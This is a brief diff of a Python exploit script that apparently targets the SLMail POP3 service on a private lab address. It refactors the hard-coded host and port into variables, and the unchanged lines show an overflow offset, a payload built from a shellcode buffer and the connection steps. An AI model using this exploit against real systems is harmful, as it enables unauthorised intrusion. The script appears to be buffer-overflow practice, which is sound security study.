@@ -1,5 +1,8 @@
 import socket
 
+server = '192.168.1.116'
+port = 110
+
 #offset
 offset = 2606
 
@@ -52,7 +55,7 @@ payload += buf
 try:
     print("Connecting to SLMail...")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("192.168.1.116"), 110)
+    s.connect((server, port))
     print("Receiving banner,,,")
     s.recv(1024)
     print("Sending user command,,,")
